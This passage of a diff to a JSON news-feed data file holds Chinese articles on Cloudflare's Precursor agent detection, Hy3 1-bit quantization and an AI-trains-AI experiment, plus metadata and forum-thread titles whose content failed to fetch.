0\n毫秒内跳到目标位置，瞬间滚过长页面，以固定节奏输入文字，或者完全跳过人类阅读和寻找控件的停留时间。CDP\n也可能产生可观察的副作用。把时间窗口拉长以后，焦点、页面可见性、输入事件、请求路径、访问速率、账户状态和最终业务结果还能互相校验。\n所以 Playwright\n改变的不是“网站还能不能检测自动化”，而是检测需要付出多少成本。读一个属性就下结论的时代正在过去，防守方必须采集更长、更密的行为序列，并接受判断只能是概率性的。\nFP-Agent\n用机器学习测试 Agent 行为是否可分\n2026 年，加州大学戴维斯分校的研究者发表了预印本\nFP-Agent\n，专门测量\nBrowser agent\n能否与人类以及彼此区分。这个实验的重要性，不只在于它发现了几个 agent\n怪动作，而在于它把问题写成了一个可训练、可比较的多分类任务。\n研究团队搭建了一个带监测脚本的测试网站，让七种 Browser agent\n完成订机票、购物和论坛互动三类任务。每种 agent 运行 1,000 次，另外招募\n56 名学生，收集了 546 份人类操作样本。研究者提取 418 个浏览器指纹特征和\n50 个行为特征，再用 XGBoost\n分别训练浏览器指纹、行为指纹和混合特征分类器。\n结果显示，两类信号的区分力差了一截。只看浏览器指纹时，分类器的 F1\n大约是 0.8。多个 agent\n共用相似浏览器配置时，模型很容易把它们混在一起。加入打字、滚动和鼠标行为后，行为与混合分类器在这组受控数据里取得接近满分的\nF1。研究者的 FP-Agent 识别了全部七种 agent，而同一研究里的 Cloudflare\n防护只拦下其中一种。\n这并不证明一个 XGBoost 模型已经解决 Agent Detection。实验只有七种\nagent、三类任务和一组学生参与者，软件版本与运行环境也固定。模型可能学到某一版\nagent\n的实现习惯，下一版加入拟人化轨迹后，效果就会下降。论文真正更新的判断是：浏览器属性不够时，agent\n仍会暴露稳定的行为差异；防守方可以用机器学习从这些差异中分类，但必须持续采集新样本、更新特征和重训模型。\n这会形成一场长期竞赛。检测模型学习 agent 的打字和移动方式，agent\n开发者再让动作更像人。FP-Agent\n在这组样本里测出了稳定差异，没有证明这些差异会永久存在，也没有给出生产环境的通用识别率。\nPrecursor 选择持续修正信任\nCloudflare 将\nPrecursor\n定义为客户端、session\n级的行为验证系统。它属于 Enterprise Bot Management，也是 Turnstile\n的可选补充。Turnstile\n擅长在登录、注册和结账等关键时刻做一次验证；Precursor\n补的是这些检查点之间的活动。\n它先在经过 Cloudflare 的 HTML\n响应里动态注入脚本。脚本持续记录指针移动、键盘活动的时间与节奏、焦点变化和页面可见性，再把压缩后的事件送回边缘节点。Cloudflare\n的评估器不只看某个动作快不快，还会交叉检查不同信号：页面不可见时为什么还有指针移动，文本框没有焦点时为什么出现键盘事件，整段轨迹是否前后自洽。\nPrecursor 也改变了做决定的时机。用户通过一次挑战后，不会因此获得整段\nsession 的永久通行证。Cloudflare 的\n更新说明\n写明，系统会随着行为变化重新验证\nchallenge clearance，并用 session 上下文更新 Bot Score。原始行为流由\nCloudflare 内部处理，客户使用的是由它推导出的 session\n上下文、分数和规则结果。后续请求可能被放行、交给 Security Rules\n处理，或再次接受挑战。\n这套设计的核心不是寻找一个能一锤定音的 Agent 指纹。Cloudflare\n选择持续收集许多不完整的证据，让它们互相校验，再随着 session\n展开修正信任。对攻击者来说，改掉一个属性还不够，整段访问都要维持合理行为。对网站来说，也不必自己部署采集服务、实时分类器和处置接口，结果可以直接进入已有的\nCloudflare 规则。\n它最自然的用户，是已经把 Web 或单页应用放在 Cloudflare 后面，并需要\nEnterprise Bot Management\n持续覆盖页面活动的网站运营方。登录、注册、结账之外仍有大段访问需要观察，或团队希望少弹\nCAPTCHA 但继续发现高级自动化，才是它最典型的使用场景。Cloudflare\n同日材料对实际开放范围的描述并不一致，因此不能从这个产品位置反推出哪些账户已经能够使用。它也不负责账户身份验证，不替应用决定某个用户或\nagent 有权做什么。\nCloudflare 表示，Precursor\n只记录键盘活动的时间与节奏，不记录实际字符，也不把行为信号绑定到账户、登录身份或持久个人资料。这限定了它的判断基准：它观察当前\nsession 的行为一致性，不建立某个具体人的长期行为身份。\n竞品在不同位置提高攻击成本\n持续看行为并非 Cloudflare 独有。\nHUMAN\n和\nDataDome\n同样强调\nsession 或完整访问路径，这部分与 Precursor 直接竞争。两家公司还分别提供\nAgenticTrust\n和\nAgentic\nTrust\n，把已声明的 Agent\n身份与访问政策放进相邻的控制层。行为检测和身份治理在产品组合里靠得很近，解决的仍是两个问题。\nKasada\n选择了另一种成本模型。它更重视客户端真实性、代码执行证明和动态代码，让攻击者不断付出逆向与维护代价。\nAkamai Bot\nManager\n和\nImperva\nAdvanced Bot Protection\n则把请求、设备、行为和威胁情报放进企业级 WAAP\n套件。\nArkose\nLabs\n主要在注册、登录、支付等高价值节点施加自适应挑战，目标是直接破坏攻击者的投入产出比。\nFingerprint\n和\nreCAPTCHA Enterprise\n更像信号或升级验证组件，需要客户自己把判断接到业务处置上。\nPrecursor 最清楚的差异不在某一种鼠标特征，而在 Cloudflare\n同时控制脚本分发、边缘评估、Bot Score、挑战和 WAF 规则。已有 Cloudflare\n客户可以少接几层系统，也能让 session\n信号立即影响后续请求。这是分发与集成优势，尚不足以证明它的算法比竞品更准。\n行为检测之后，还缺身份与授权\nPrecursor\n的第一条边界，是所有行为都可以继续模仿。攻击者可以放慢速度、加入停顿、生成鼠标轨迹、维持\nCookie 和账户状态。整段 session\n比一个指纹更难伪造，却不会产生不可伪造的人类证明。检测提高的是成本，不是确定性。\n第二条边界更根本：行为不像人，不代表它不合法。一个得到授权的 agent\n本来就可能没有鼠标轨迹，几秒钟填完表单。反过来，一个有签名身份的 agent\n也可能遭到提示注入或超出用户授权。Agent\n身份、用户委托、业务许可和当前行为是四个问题，任何一层都不能替代其余部分。\n网站治理 Agent\n流量时需要分别判断身份、用户委托、业务权限和当前 Session 行为，Precursor\n只覆盖运行时风险这一层\n无感检测还会把误报藏进后台分数。只用键盘、屏幕阅读器、语音控制、开关输入或远程桌面的用户，可能产生完全不同的轨迹。\nW3C 对 CAPTCHA\n无障碍问题的总结\n没有评估\nPrecursor，却暴露了相同的设计义务：产品需要可访问的升级验证、申诉和人工恢复。Cloudflare\n尚未公开按用户群体划分的误报率，外界也缺少 Precursor\n的独立准确率与性能测试。\n隐私问题也不会因为“不记录实际按键”自动消失。交互时间、session\n标识、保留期限、拒绝采集、模型训练复用和判断审计都需要明确规则。网站运营方至少需要知道数据留多久、谁能访问，以及错误判断如何复查。\n产品状态本身还有一处官方冲突。Cloudflare 在\n2026\n年 7 月 13 日的新闻稿\n中宣布 Precursor 已经 GA；同日技术博客却仍写着\nrolling out，并称产品会免费到当年稍晚的 GA\nrelease。实际开放范围和收费状态仍要以账户与合同为准。\nBrowser agent 让 Bot Detection\n进入了一个更难也更现实的阶段。网站不能再靠真实浏览器属性推断人类意图，也不能把所有自动化都当成攻击。Precursor\n补上运行时行为这一层，却没有替网站解决身份和授权。只有把这些判断接在一起，合法\nagent\n才不必靠模仿人类通行，恶意自动化也不能只换一套浏览器外壳就混过去。",
-      "content_format": "text/plain",
-      "content_status": "ok",
-      "content_via": "http",
-      "content_source_url": "https://yage.ai/share/cloudflare-precursor-agent-detection-20260716.html",
-      "content_chars": 6067,
-      "content_sha256": "c694d8cfecef63ddc29a6847c8cca7f1012db4d7530feb1fedea21ec56039367",
-      "content_fetched_at": "2026-07-16T22:10:20.215985+00:00",
-      "content_error": "",
-      "time_precision": "exact",
-      "source_name": "yage.ai share (Deep News)",
-      "fetch_status": "ok",
-      "url_corrected": false
-    },
-    {
-      "id": "a:8cb1873e603bdeb4",
-      "kind": "publish",
-      "text": "yage-share published: 腾讯混元 Hy3 的 1-bit 量化：单卡能装下，离好用还有多远",
-      "actor": "yage-share",
-      "actor_url": "https://yage.ai/share/",
-      "created_at": "2026-07-16T00:00:00+00:00",
-      "html_url": "https://yage.ai/share/hy3-one-bit-single-gpu-20260716.html",
-      "title": "腾讯混元 Hy3 的 1-bit 量化：单卡能装下，离好用还有多远",
-      "via": "rss",
-      "collect_mode": "rss",
-      "content": "模型架构\n推理与性能\n中国科技生态\n7 月 14 日，腾讯混元发布了 Hy3 的 IQ1_M 和 Q4_K_M 官方 GGUF\n量化版本。传播最广的数字是：一个 295B 参数的模型压缩后约为 85.5\nGiB，可以加载进单张 96GB 显卡。\n这个数字没有问题，但它只回答了权重能否装下。模型运行时还需要 KV cache\n和计算缓冲，量化也可能影响复杂任务的可靠性。再加上首字等待和生成速度，单卡能加载与日常好用之间，至少还有三笔账。\nHy3 做了怎样的能力取舍\nHy3\n是腾讯混元发布的开源纯文本模型，拥有 295B 总参数、21B 激活参数，支持\n256K 上下文，采用 Apache 2.0 许可。它使用 MoE\n架构，每次只调用一部分专家权重。总参数决定模型的容量，21B\n激活参数则控制每一步实际参与计算的规模。\n这种设计带来了清楚的取舍。根据第三方评测机构\nArtificial Analysis\n的综合测试，Hy3 与 DeepSeek V4-Pro 处在相近区间，但低于\nGLM-5.2\n。具体到任务，网页搜索、长文检索和工具编排是它的相对强项；仓库级\ncoding、终端操作和长程软件工程则弱一些。腾讯混元用较低的激活计算量，换来较宽的\nagent 能力覆盖，没有同时追求最强的 coding 表现。\n同一套综合评测下，Hy3 与 DeepSeek V4-Pro\n接近，但低于 GLM-5.2\n1-bit 并不是整个文件每权重 1\nbit\n量化会用较低精度保存模型权重，从而减少显存占用。\nAngelSlim/Hy3-GGUF\n中最受关注的 IQ1_M，通常被称为 1-bit 版本。\n这里的 1-bit 是量化规格的名称。根据\nHugging\nFace 文件元数据\n，无 MTP 的\nHy3-IQ1_M.gguf\n为 83.30\nGiB，完整文件平均每个权重占 2.425 bit，也就是 2.425 BPW；带 MTP 的版本为\n85.45 GiB、2.488 BPW。Q4_K_M 的无 MTP 版本则是 169.81 GiB。\n实际位宽高于名字，是因为官方没有把所有张量压到同一精度。注意力、共享专家、嵌入和输出等关键路径保留了更多信息，缩放参数和文件元数据也会占空间。IQ1_M\n压得最狠的是大量路由专家权重，整个文件仍是一套混合精度配方。\n96GB 单卡还要给 KV cache\n留位置\n权重加载后，模型还要保存自己读过的上下文。\nKV cache\n就是这些注意力中间结果，输入越长，占用的显存越多。Hy3 使用 q8 KV cache\n时，64K 上下文约需 10.63 GiB。\n把它与权重相加，单卡预算就变得紧张。无 MTP 的 IQ1_M 占 83.30\nGiB，加上 64K q8 KV cache 后达到 93.93 GiB，只剩 2.07 GiB。CUDA\ncontext、计算缓冲、计算图和显存碎片还没有算进去。官方确实提供了单张 H20\n跑 64K 的配置，并把它标为\ntight，但没有公开这套配置的峰值显存和速度日志。它证明方案可以尝试，不足以说明生产运行会很从容。\n带 MTP 的权重是 85.45 GiB。加上同样的主模型 KV\ncache，算术结果已经达到 96.08 GiB，尚未加入 MTP 自己需要的 draft KV\ncache 和其他运行开销。官方的单卡方案因此推荐无 MTP、64K 上下文和 q8 KV\ncache。Hy3 支持 256K，是模型的架构上限，并不代表单张 96GB\n卡也能使用这么长的上下文。\nHy3 IQ1_M 在 96 GiB 单卡中的权重与 64K KV\ncache 预算\n省下的显存，可能由可靠性来付账\n目前，官方没有公开 BF16、FP8、Q4_K_M 和 IQ1_M\n在同一套评测流程下的完整对照。公开说法是：4-bit 在\nagent、代码、工具调用和长文理解上接近 BF16；1-bit\n的长文理解接近原版，agent 和代码能力有小幅回落。\n问题在于，小幅回落落到多步任务里，未必仍然小。一个 coding agent\n要连续选择工具、填写 JSON\n参数、修改代码、判断测试结果。任何一步出现偏差，后面的动作都可能跟着改变。普通问答看不出明显差异，并不能证明长程任务同样可靠。\n这只是风险机制，不是已经测出的 Hy3 IQ1_M 失败率。Hy3\n的参数规模较大，IQ1_M 又会按权重重要性分配不同精度，实际表现可能比朴素的\n1-bit 直觉更好。答案仍要靠真实工作流的 A/B\n测试，尤其要记录格式错误、无效工具调用、重试次数和完整任务成功率。\n速度够交互，长上下文仍然要等\n现有性能数据主要来自社区转换版本，不能直接当成官方 IQ1_M 或 Q4_K_M\n的统一实测。社区 GGUF 在 M3 Max 128GB 上大约能生成 23–25 tok/s；社区 MLX\n版本在 M3 Ultra 上约为 27–29 tok/s。这些速度足以进行日常交互。\nMLX 实测\n与\nGGUF 实测\n使用了不同量化，数字只能用来判断大致体感。\n生成速度也不是全部。模型先读 prompt 的阶段叫 prefill。M3 Max\n上的社区测试约为 41 tok/s，冷读 8K prompt 粗略需要接近 200\n秒。对于上下文很长的 coding\nagent，真正影响节奏的可能是首字等待，而不是后面每秒生成多少 token。\n两张 H200 运行社区 IQ2_M 的测试为 72.2 tok/s，打开 MTP 后达到 81.5\ntok/s。MTP 会一次预测多个后续 token，再由主模型验证。官方宣称它可以提速\n50%–60%，但社区可审计结果高度依赖置信度门控；这组 H200 测试的提升约为\n13%，Apple Silicon 上则基本没有收益。\nllama.cpp PR\n#25395\n记录了这些差异。\n已有 96GB 显卡，可以从无 MTP、16K 或 32K 上下文的 IQ1_M\n开始测试。已有 256GB M3 Ultra，也可以尝试社区 4-bit\nMLX。私有生产部署更适合先评测\nQ4_K_M；使用率不高、数据也不敏感的场景，API 往往更省维护成本。\nHy3\n展示了大模型压缩已经能做到什么，也把代价一并暴露出来：更低的激活计算量、更小的权重文件、较短的现实上下文，以及尚待验证的复杂任务可靠性。它适合已有硬件的人做实验，还不足以成为单独购买高配\nMac 或 H20 的理由。",
-      "content_format": "text/plain",
-      "content_status": "ok",
-      "content_via": "http",
-      "content_source_url": "https://yage.ai/share/hy3-one-bit-single-gpu-20260716.html",
-      "content_chars": 2703,
-      "content_sha256": "6dd2d3f44a0d49ca9aa73330cd1cbec833de843810f2db3676060ee36dd58afc",
-      "content_fetched_at": "2026-07-16T22:10:20.535476+00:00",
-      "content_error": "",
-      "time_precision": "exact",
-      "source_name": "yage.ai share (Deep News)",
-      "fetch_status": "ok",
-      "url_corrected": false
-    },
-    {
-      "id": "a:444178e8d1142302",
-      "kind": "publish",
-      "text": "yage-share published: AI Trains AI：一次公开实验如何校准自我改进的故事",
-      "actor": "yage-share",
-      "actor_url": "https://yage.ai/share/",
-      "created_at": "2026-07-15T00:00:00+00:00",
-      "html_url": "https://yage.ai/share/ai-trains-ai-self-improvement-20260715.html",
-      "title": "AI Trains AI：一次公开实验如何校准自我改进的故事",
-      "via": "rss",
-      "collect_mode": "rss",
-      "content": "AI Agent\n科研与技术前沿\nAI\n自我改进最诱人的地方，是它可能把模型研发变成一个会加速的循环。模型参与生成数据、设计奖励、编写实验并运行训练，再把结果送回下一轮。每转一圈，系统就能尝试更多方案，更快拿到反馈，也可能花更少的钱。\n不过，AI 参与研发，离 AI\n自己推动下一代模型进步还有一段距离。今天的智能体已经能写代码、跑实验，但研究什么、怎样评分、给多少算力、最后是否接受结果，通常仍由人决定。严格意义上的自我改进要求更高：系统不仅要提升下一代模型的核心能力，还要让这种提升在后续迭代中保留下来。现有公开证据主要支持前一种能力，也就是研发自动化。\n过去几年已经有不少公开原型，只是各自接上了不同的一段。\nEureka\n让大模型编写奖励函数，再用强化学习训练内层策略，但写奖励的外层模型并不会随结果更新。\nAI Scientist\n打通了从想法、实验到论文的流程，负责科研的智能体本身却是静态的。\nAlphaEvolve\n能搜索和优化训练内核，Gemini\n自己并不在循环里学习。允许智能体修改代码库的\nDGM\n，同样冻结了基础模型。\nPostTrainBench\n则把自动后训练做成基准测试，结果显示智能体仍明显落后于官方指令微调基线。\nDan Austin 在 2026 年 7 月 14 日发布的\nai-trains-ai\nv0.1\n，把这些分散的环节放进了同一个公开项目。它不是第一个 AI 训练 AI\n的实验，外部研究者也无法完整重放整个过程。但在一个仓库里，我们同时看到了外层策略如何学习、内层模型如何训练、结果能否迁移、运行中出了什么问题、作者报告了多少成本，以及评估器有没有量对。这个项目因此很适合回答一个更具体的问题：所谓自我改进，究竟在哪些地方已经形成反馈循环，又在哪些地方还依赖人类搭好的轨道。\n图\n1：自我改进在成果持久性、代码搜索、权重更新和科研自治等层级的划分。\n一次外层迭代，实际上发生了什么\n项目代码公开在\nGitHub\n，训练后的外层\nLoRA 权重放在\nHugging\nFace\n。发起人\nDan Austin\n在公开履历中自述为微软首席软件工程师，也是仓库里唯一可见的人类维护者。README\n同时写明，Fable 5 编写了项目的每一行代码。Dan\n此前做过计算器强化学习任务、TerminalBench\n基础设施和多智能体评估框架，这些工作最后汇合到了这个项目里。\n外层智能体使用\nQwen3.6。它收到的任务类似“训练一个小模型，让它学会处理多步查询”，但它不直接修改模型权重。它要先交出一份完整的后训练方案，其中包括两类文件：一类定义训练数据、模型可以调用的工具和训练时使用的奖励规则；另一类决定从哪个基础模型开始，以及学习率、训练步数、batch\nsize 等超参数。\n这里的基础模型，是内层训练开始前的起点。项目只允许它在 Qwen3-0.6B 和\nQwen3-1.7B 之间选择。选定以后，GPU 才会从这份原始 checkpoint\n开始做后训练。因此，“选择\n1.7B”不是在两个训练结果中挑赢家，而是在训练开跑之前决定把哪一个模型送进训练流程。\n真正执行内层训练的是\nprime-rl。它是一套运行强化学习后训练的框架，项目默认已经给好了训练配置。外层智能体也可以在作业里的\n[prime_rl]\n配置表中修改采样温度、优化器、算法变体、学习率调度和\nloss。换句话说，prime-rl\n不是另一个被选择的模型，而是负责把这份训练方案实际跑起来的工具。\n作业通过预验证后进入 GPU\n队列，而且只能训练一次。外层智能体看不到训练结果，也没有机会根据结果回来修改方案。训练结束后，隐藏评估程序用一组未公开题目测试小模型，记录训练后的绝对表现，以及它比最佳未训练基线提高了多少。这两项结果再和验证效率、训练速度合成外层\nreward，用来更新智能体的 LoRA。\n所以这个实验里有两层学习。内层小模型按照智能体写出的方案接受后训练；外层智能体则根据每份方案最后拿到的\nreward，逐渐改变自己以后会写出什么方案。人仍然预先规定了任务类型、评估方式、奖励公式、可选模型、工具链和预算。它更像一个正在学习怎样设计后训练实验的智能体，还不是能够独立决定研究方向的科学家。\n图 2：外层智能体生成作业与内层真实训练嵌套构成的反馈回路。\n定量结果：先学会把实验跑通，再学会改善训练结果\n整个外层训练一共进行了 54 步。作者报告的综合 reward 在第 50\n步达到最高值 0.627，第 54 步结束时为 0.549。这个 reward 不是\nloss，也不是科研能力百分比。它是作者为这个环境设计的训练信号：验证效率占\n0.35，内层训练结果占 0.60，训练速度占\n0.05。它的绝对值不能和别的项目比较，作用只是让 GRPO\n知道哪些训练方案以后应该更常出现。\n把综合 reward\n分开以后，学习过程出现了两个阶段。早期的变化主要是实验更常跑通。无效提交减少，通过验证并完成\nGPU\n训练的作业增加，但训练后的小模型并没有明显变好。换句话说，外层智能体先学会了怎样交出一份能执行的训练方案。\n后半程才开始出现和模型效果有关的变化。这里有两个容易混淆的指标。训练后得分，是内层小模型完成后训练以后，在隐藏题目上的表现。训练作业质量分，则把这个训练后得分和“相对最佳未训练模型提高了多少”合成到一起。这里的最佳未训练模型，指\n0.6B 和 1.7B\n在没有接受这次后训练之前，隐藏评测得分较高的那个。按作者的批次聚合口径，作业质量分大约从\n0.30 升到 0.41，训练后得分也从约 0.04 的噪声水平进入 0.22 到 0.48\n的区间。这才是实验中更接近“训练方案开始产生效果”的定量信号。\n这组数字仍要谨慎解释。项目没有公开每次迭代的完整产物，我们无法独立重建每一阶段为什么上涨。训练后得分也只来自项目自己的隐藏合成任务，不代表真实世界里的通用能力。\n模型选择的变化，可以帮助我们看见外层策略具体改了什么。早期只有 42%\n的训练作业从 Qwen3-1.7B 开始，后期这个比例升到 95%。1.7B\n参数更多，通常能力也比 0.6B\n强，但训练更慢、成本更高，而且更大并不保证在有限训练预算下获得更大的提升。智能体可以调用\nget_baseline_scores\n查看两个模型训练前的起始表现，因此这次变化并不深奥：它学会了读取已有信号，把大部分训练预算转向更可能得到高分的起点。这证明外层\nreward 的确改变了策略行为，但还不能算研究品味。\n[prime_rl]\n的使用比例从 21% 升到接近\n78%，则说明越来越多的作业不再完全接受默认训练参数，而是主动设置采样温度、优化器、算法变体、学习率调度和\nloss。它再次证明训练方案的写法发生了变化，但作者没有做消融实验，无法说明其中哪个配置真正改善了结果。\n最后再看没有参与外层训练的任务。项目保留了一个名为 triage\n的任务，四个阶段各测试 10 次，平均分依次是 0.399、0.438、0.545 和\n0.492。第 34 步明显高于起点，第 54\n步又有所回落。这条曲线只支持有限、非单调的迁移：外层策略学到的部分做法可以带到同一类新任务，但现有数据不足以证明稳定而广泛的泛化能力。\n图 3：外层综合奖励变化与 triage 保留任务测试的分数走势。\n评估器量错了，奖励曲线照样会上涨\n项目的\n评估器复盘\n记录了一个很具体的错误。旧版工具使用检测器读取函数名时，寻找的是\n.function.name\n，真实运行对象里却只有\n.name\n。早期单元测试和验证脚本用了另一种数据结构，没有走到这条真实路径。结果，占奖励权重\n0.4 的工具使用得分，在早期测试中一次也没有触发。\n作者写道，旧版实验里看见的奖励上涨，其实发生在这个测量错误制造的假象中。这不能解释成智能体故意作弊。它说明的是另一件事：只要反馈定义有问题，强化学习仍然可以调出一条不断上涨的奖励曲线。评估器不只是实验结束后的计分工具，它本身就是学习环境的一部分。\n发现错误后，作者废弃了旧检查点，重新设计任务和评估标准，并从零开始训练。现在公开的\n54 步曲线，来自修复后的重跑。\n这个实验真正证明了什么\nai-trains-ai\n最有意思的结果不是 reward 达到了\n0.627，而是外层强化学习确实改变了一个训练智能体的行为。它先学会减少无效作业，再逐渐改变基础模型与训练配置的选择；内层小模型完成了真实训练，隐藏评估结果也会反过来更新外层策略。在没有参与训练的\ntriage 任务上，这种变化还出现了有限的迁移。\n但这个结论只在项目预先搭好的环境里成立。任务由人选择，reward\n由人设计，工具与预算由人提供。外层智能体学会的是怎样在这套规则下写出更高分的训练作业。现有证据还不足以说明它获得了通用的研究品味，更不能说明它已经能够自主设计下一代模型。\n以后再看到 AI 自我改进实验，最先应该问的不是 reward\n涨了多少，而是三件事：\n这个 reward 到底在奖励什么？\nreward 上涨后，智能体的具体行为发生了什么变化？\n这些变化是否真的让未参与训练的新任务变得更好？\n这三个问题把代理指标、行为变化和真实结果分开。\nai-trains-ai\n已经把前两步接了起来，也给出了第三步的初步信号。它展示的不是一个已经完成的自我进化系统，而是一次边界清楚、可以继续验证的局部闭环。",
-      "content_format": "text/plain",
-      "content_status": "ok",
-      "content_via": "http",
-      "content_source_url": "https://yage.ai/share/ai-trains-ai-self-improvement-20260715.html",
-      "content_chars": 3902,
-      "content_sha256": "7dabc1acbbceeaa594971efb628da26843c0bb049debc45b643d5bd8226deba3",
-      "content_fetched_at": "2026-07-16T22:10:20.773547+00:00",
-      "content_error": "",
-      "time_precision": "exact",
-      "source_name": "yage.ai share (Deep News)",
-      "fetch_status": "ok",
-      "url_corrected": false
-    }
-  ],
-  "summary": {
+  "source_id": "blog_watch",
+  "collect_date": "2026-07-17",
+  "collect_window": {
+    "start": "2026-07-15T00:00:00+00:00",
+    "end": "2026-07-16T22:09:02.312939+00:00",
+    "hours": 46
+  },
+  "producer": {
+    "name": "sentinel-site",
+    "version": "0.1.0",
+    "run_id": "29538555743",
+    "commit": "949ac4a"
+  },
+  "stats": {
+    "total": 8,
     "by_kind": {
       "publish": 8
     },
@@ -222,9 +28,646 @@
       "cocomelonc": 1,
       "yage-share": 3
     },
+    "failed_lists": [],
+    "sources_ok": 44,
+    "sources_failed": [],
+    "baselines": 0,
+    "via_sources": {
+      "llm": 10,
+      "browser_llm": 8,
+      "rss": 26
+    },
+    "llm_usage": {
+      "model": "deepseek-v4-flash",
+      "requests": 13,
+      "calls": 13,
+      "prompt_tokens": 13528,
+      "completion_tokens": 3706,
+      "total_tokens": 17234,
+      "prompt_cache_hit_tokens": 8960,
+      "prompt_cache_miss_tokens": 4568
+    },
     "by_content_status": {
       "failed": 3,
       "ok": 5
     }
-  }
+  },
+  "items": [
+    {
+      "id": "a:d7c55b366a7db97c",
+      "who": "unknowncheats-ac",
+      "who_url": "https://www.unknowncheats.me/forum/general-programming-and-reversing/",
+      "action": "publish",
+      "target": "Looking for an alternative of Themida/VMProtect that someone made",
+      "target_url": "https://www.unknowncheats.me/forum/general-programming-and-reversing/755668-looking-alternative-themida-vmprotect.html",
+      "text": "unknowncheats-ac published: Looking for an alternative of Themida/VMProtect that someone made",
+      "at": "2026-07-16T22:09:02.312939+00:00",
+      "external_id": "a:d7c55b366a7db97c",
+      "url": "https://www.unknowncheats.me/forum/general-programming-and-reversing/755668-looking-alternative-themida-vmprotect.html",
+      "title": "Looking for an alternative of Themida/VMProtect that someone made",
+      "content": "unknowncheats-ac published: Looking for an alternative of Themida/VMProtect that someone made",
+      "content_format": "text/plain",
+      "content_status": "failed",
+      "content_via": "",
+      "content_source_url": "https://www.unknowncheats.me/forum/general-programming-and-reversing/755668-looking-alternative-themida-vmprotect.html",
+      "content_chars": 0,
+      "content_sha256": "",
+      "content_fetched_at": "2026-07-16T22:09:47.850312+00:00",
+      "author": "unknowncheats-ac",
+      "author_name": "UnknownCheats Anti-Cheat",
+      "author_url": "https://www.unknowncheats.me/forum/general-programming-and-reversing/",
+      "published_at": "2026-07-16T22:09:02.312939+00:00",
+      "collected_at": "2026-07-16T22:09:02.312939+00:00",
+      "tags": [
+        "kind:publish",
+        "src:unknowncheats-ac",
+        "via:browser_llm",
+        "channel:browser_llm"
+      ],
+      "hashtags": [],
+      "links": [
+        "https://www.unknowncheats.me/forum/general-programming-and-reversing/",
+        "https://www.unknowncheats.me/forum/general-programming-and-reversing/755668-looking-alternative-themida-vmprotect.html"
+      ],
+      "refs": {
+        "actor": {
+          "login": "unknowncheats-ac",
+          "url": "https://www.unknowncheats.me/forum/general-programming-and-reversing/"
+        },
+        "repo": null,
+        "target_user": null,
+        "forkee": null,
+        "source": {
+          "id": "unknowncheats-ac",
+          "name": "UnknownCheats Anti-Cheat",
+          "home_url": "https://www.unknowncheats.me/forum/general-programming-and-reversing/"
+        },
+        "article": {
+          "title": "Looking for an alternative of Themida/VMProtect that someone made",
+          "url": "https://www.unknowncheats.me/forum/general-programming-and-reversing/755668-looking-alternative-themida-vmprotect.html",
+          "content_sha256": ""
+        }
+      },
+      "media": {
+        "photos": [],
+        "videos": []
+      },
+      "metrics": {
+        "circle_count": null,
+        "trending": false,
+        "trending_front_page": false
+      },
+      "flags": {
+        "kind": "publish",
+        "via": "browser_llm",
+        "collect_mode": "browser_llm",
+        "time_precision": "daily_window",
+        "is_follow": false,
+        "is_repo_event": false,
+        "url_corrected": false,
+        "fetch_status": "ok",
+        "content_status": "failed",
+        "content_via": ""
+      }
+    },
+    {
+      "id": "a:80be1f6a6462ae93",
+      "who": "unknowncheats-ac",
+      "who_url": "https://www.unknowncheats.me/forum/general-programming-and-reversing/",
+      "action": "publish",
+      "target": "[Plugin] ShowComments (Pseudocode Edition) — fork for IDA 9.3 / Qt6, lists decompiler",
+      "target_url": "https://www.unknowncheats.me/forum/general-programming-and-reversing/762606-plugin-showcomments-pseudocode-edition-fork-ida-9-3-qt6-lists-decompiler.html",
+      "text": "unknowncheats-ac published: [Plugin] ShowComments (Pseudocode Edition) — fork for IDA 9.3 / Qt6, lists decompiler",
+      "at": "2026-07-16T22:09:02.312939+00:00",
+      "external_id": "a:80be1f6a6462ae93",
+      "url": "https://www.unknowncheats.me/forum/general-programming-and-reversing/762606-plugin-showcomments-pseudocode-edition-fork-ida-9-3-qt6-lists-decompiler.html",
+      "title": "[Plugin] ShowComments (Pseudocode Edition) — fork for IDA 9.3 / Qt6, lists decompiler",
+      "content": "unknowncheats-ac published: [Plugin] ShowComments (Pseudocode Edition) — fork for IDA 9.3 / Qt6, lists decompiler",
+      "content_format": "text/plain",
+      "content_status": "failed",
+      "content_via": "",
+      "content_source_url": "https://www.unknowncheats.me/forum/general-programming-and-reversing/762606-plugin-showcomments-pseudocode-edition-fork-ida-9-3-qt6-lists-decompiler.html",
+      "content_chars": 0,
+      "content_sha256": "",
+      "content_fetched_at": "2026-07-16T22:09:58.706617+00:00",
+      "author": "unknowncheats-ac",
+      "author_name": "UnknownCheats Anti-Cheat",
+      "author_url": "https://www.unknowncheats.me/forum/general-programming-and-reversing/",
+      "published_at": "2026-07-16T22:09:02.312939+00:00",
+      "collected_at": "2026-07-16T22:09:02.312939+00:00",
+      "tags": [
+        "kind:publish",
+        "src:unknowncheats-ac",
+        "via:browser_llm",
+        "channel:browser_llm"
+      ],
+      "hashtags": [],
+      "links": [
+        "https://www.unknowncheats.me/forum/general-programming-and-reversing/",
+        "https://www.unknowncheats.me/forum/general-programming-and-reversing/762606-plugin-showcomments-pseudocode-edition-fork-ida-9-3-qt6-lists-decompiler.html"
+      ],
+      "refs": {
+        "actor": {
+          "login": "unknowncheats-ac",
+          "url": "https://www.unknowncheats.me/forum/general-programming-and-reversing/"
+        },
+        "repo": null,
+        "target_user": null,
+        "forkee": null,
+        "source": {
+          "id": "unknowncheats-ac",
+          "name": "UnknownCheats Anti-Cheat",
+          "home_url": "https://www.unknowncheats.me/forum/general-programming-and-reversing/"
+        },
+        "article": {
+          "title": "[Plugin] ShowComments (Pseudocode Edition) — fork for IDA 9.3 / Qt6, lists decompiler",
+          "url": "https://www.unknowncheats.me/forum/general-programming-and-reversing/762606-plugin-showcomments-pseudocode-edition-fork-ida-9-3-qt6-lists-decompiler.html",
+          "content_sha256": ""
+        }
+      },
+      "media": {
+        "photos": [],
+        "videos": []
+      },
+      "metrics": {
+        "circle_count": null,
+        "trending": false,
+        "trending_front_page": false
+      },
+      "flags": {
+        "kind": "publish",
+        "via": "browser_llm",
+        "collect_mode": "browser_llm",
+        "time_precision": "daily_window",
+        "is_follow": false,
+        "is_repo_event": false,
+        "url_corrected": false,
+        "fetch_status": "ok",
+        "content_status": "failed",
+        "content_via": ""
+      }
+    },
+    {
+      "id": "a:65cf6e7d085b5f6c",
+      "who": "unknowncheats-ac",
+      "who_url": "https://www.unknowncheats.me/forum/general-programming-and-reversing/",
+      "action": "publish",
+      "target": "Lets talk about the best injection for payloads",
